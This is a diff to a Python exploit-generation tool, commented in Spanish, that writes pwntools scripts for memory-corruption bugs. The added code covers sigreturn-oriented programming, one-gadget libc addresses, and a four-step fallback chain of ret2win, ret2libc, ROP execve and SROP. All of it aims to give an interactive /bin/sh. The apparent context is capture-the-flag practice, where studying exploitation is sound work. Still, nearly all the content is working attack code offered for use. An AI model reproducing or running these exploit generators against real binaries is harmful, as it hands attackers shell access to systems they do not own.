@@ -49,7 +49,7 @@ class ExploitPlan:
 _CLASSES = [
     ("stack-overflow", ("stack buffer overflow", "stack-based buffer overflow", "desbordamiento de pila",
                         "stack overflow", "gets(", "strcpy", "stack smashing"),
-     "control de RIP (sobrescribe la direccion de retorno guardada)", ["ret2win", "rop", "ret2libc", "canary-bypass"]),
+     "control de RIP (sobrescribe la direccion de retorno guardada)", ["ret2win", "rop", "ret2libc", "advanced-rop", "canary-bypass"]),
     ("heap-overflow", ("heap buffer overflow", "heap-based overflow", "desbordamiento de heap",
                        "heap overflow", "chunk overflow"),
      "corrupcion de metadatos de heap (pisa cabeceras/punteros de chunk adyacente)", ["heap", "modern-heap", "heap-grooming"]),
@@ -197,6 +197,39 @@ def _dev_header(name: str, tag: str) -> list:
             "io = process(BINARY)   # o: io = remote('HOST', PORT)"]
 
 
+def _srop_lines(indent: str = "") -> list:
+    """Bloque SROP (sigreturn-oriented programming): con un `syscall; ret` y control de RAX=15
+    (rt_sigreturn) se monta un sigcontext falso que fija TODOS los registros a la vez. Util en
+    binarios estaticos/minimos con pocos gadgets. Ejecuta execve('/bin/sh')."""
+    L = ["# --- SROP: fija todos los registros con un sigcontext falso (rt_sigreturn = RAX 15) ---",
+         "srop_rop = ROP(elf)",
+         "pop_rax = srop_rop.find_gadget(['pop rax', 'ret'])          # para poner RAX = 15",
+         "syscall_ret = srop_rop.find_gadget(['syscall', 'ret']) or srop_rop.find_gadget(['syscall'])",
+         "binsh_addr = next(elf.search(b'/bin/sh\\x00'), 0)           # '/bin/sh' embebido o en .bss",
+         "frame = SigreturnFrame()",
+         "frame.rax = constants.SYS_execve                            # 59: execve('/bin/sh', 0, 0)",
+         "frame.rdi = binsh_addr",
+         "frame.rsi = 0",
+         "frame.rdx = 0",
+         "frame.rip = syscall_ret.address                             # el sigreturn salta aqui",
+         "# cadena: pop rax; ret ; 15 ; syscall(rt_sigreturn) ; <sigcontext falso>",
+         "chain  = p64(pop_rax.address) + p64(15) + p64(syscall_ret.address) + bytes(frame)",
+         "io.sendline(flat({OFFSET: chain}))",
+         "io.interactive()"]
+    return [indent + x for x in L]
+
+
+def _onegadget_lines(libc_var: str = "libc", indent: str = "") -> list:
+    """Bloque one-gadget: una sola direccion de libc que da execve('/bin/sh') si se cumplen sus
+    constraints (p.ej. [rsp+0x40]==NULL). Evita montar toda la cadena ret2libc cuando ya hay leak."""
+    L = [f"# --- one-gadget: execve('/bin/sh') con UNA direccion de libc (revisa constraints) ---",
+         f"# instala one_gadget y busca los candidatos:  one_gadget ./libc.so.6",
+         f"one_gadgets = [0xe3afe, 0xe3b01, 0xe3b04]   # <-- offsets reales de tu libc (one_gadget)",
+         f"og = {libc_var}.address + one_gadgets[0]     # prueba cada uno hasta cumplir constraints",
+         f"# uso tipico: sobreescribe un puntero de retorno / __free_hook / __malloc_hook con 'og'"]
+    return [indent + x for x in L]
+
+
 def develop_exploit(cls: str, facts: dict, concrete: dict, name: str = "target",
                     lang: str = "es") -> str:
     """Desarrollador de exploits multi-clase: genera un script pwntools FUNCIONAL (o la aproximacion
@@ -234,21 +267,27 @@ def develop_exploit(cls: str, facts: dict, concrete: dict, name: str = "target",
                           "rop.call(sysaddr, [binsh]) if (sysaddr and binsh) else rop.execve(binsh, 0, 0)",
                           "io.sendline(b'A'*OFFSET + rop.chain())", "io.interactive()"]
         else:
+            # NX on, no-PIE: 4 estrategias en cascada segun lo que tenga el binario
+            # (A) ret2win  (B) ret2libc estatico  (C) execve por ROP  (D) SROP si faltan gadgets
             body = pre + ["rop = ROP(elf)",
                           "win = elf.sym.get('win') or elf.sym.get('flag') or elf.sym.get('shell')",
+                          "binsh = next(elf.search(b'/bin/sh\\x00'), 0)",
+                          "sysaddr = elf.plt.get('system') or elf.sym.get('system')",
                           "if win:",
-                          "    ret = next(elf.search(asm('ret'), executable=True), 0)  # alinea la pila 16B",
-                          "    io.sendline(flat({OFFSET: [ret, win]}))              # ret2win",
+                          "    ret = next(elf.search(asm('ret'), executable=True), 0)  # alinea 16B",
+                          "    io.sendline(flat({OFFSET: [ret, win]}))              # (A) ret2win",
+                          "    io.interactive()",
+                          "elif sysaddr and binsh:",
+                          "    rop.call(sysaddr, [binsh])                           # (B) ret2libc estatico",
+                          "    io.sendline(flat({OFFSET: rop.chain()})); io.interactive()",
                           "else:",
-                          "    binsh = next(elf.search(b'/bin/sh\\x00'), 0)",
-                          "    sysaddr = elf.plt.get('system') or elf.sym.get('system')",
-                          "    if sysaddr and binsh:",
-                          "        rop.call(sysaddr, [binsh])                       # ret2libc estatico",
-                          "    else:",
+                          "    try:",
                           "        rop.rax=0x3b; rop.rdi=binsh; rop.rsi=0; rop.rdx=0",
-                          "        rop.raw(rop.find_gadget(['syscall','ret']).address)  # execve",
-                          "    io.sendline(flat({OFFSET: rop.chain()}))",
-                          "io.interactive()"]
+                          "        rop.raw(rop.find_gadget(['syscall','ret']).address)  # (C) execve por ROP",
+                          "        io.sendline(flat({OFFSET: rop.chain()})); io.interactive()",
+                          "    except Exception:",
+                          "        # (D) SROP: pocos gadgets -> sigcontext falso (rt_sigreturn)"]
+            body += _srop_lines("        ")
         return "\n".join(_dev_header(name, tag) + body)
 
     if cls == "format-string":
@@ -296,6 +335,9 @@ def develop_exploit(cls: str, facts: dict, concrete: dict, name: str = "target",
                 "alloc(2, 0x40); free(2); free(2)          # double-free (o usa UAF)",
                 "alloc(3, 0x40, p64(target))               # envenena el fd del tcache",
                 "alloc(4, 0x40); alloc(5, 0x40, p64(libc.sym.get('system', 0)))  # 5 cae en el objetivo",
+                ""] + _onegadget_lines("libc") + [
+                "# alternativa a system(): escribe 'og' (one-gadget) en __free_hook/__malloc_hook",
+                "# alloc(5, 0x40, p64(og))",
                 "",
                 "# 3) DISPARA: si target=__free_hook -> free() de un chunk con '/bin/sh'; si FSOP -> _IO",
                 "io.interactive()"]
@@ -359,7 +401,10 @@ def _pwn_script_from_proof(proof: dict, name: str = "target") -> str:
              "io.sendline(flat({OFFSET: rop.chain()}))",
              "leak = u64(io.recvline().strip().ljust(8, b'\\x00'))",
              "libc = elf.libc; libc.address = leak - libc.sym['puts']",
+             "# opcion 1: ret2libc system('/bin/sh')",
              "rop2 = ROP(libc); rop2.system(next(libc.search(b'/bin/sh\\x00')))",
+             "# opcion 2 (one-gadget): og = libc.address + <offset de one_gadget ./libc.so.6>;",
+             "#   io.sendline(flat({OFFSET: og}))  # si cumple constraints, mas corto que la cadena",
              "io.sendline(flat({OFFSET: rop2.chain()}))", "io.interactive()"]
     elif "pie" in strat:
         B = [f"OFFSET = {off}", f"elf.address = {base or 0}  # sandbox ASLR-off (con ASLR real: leak)",
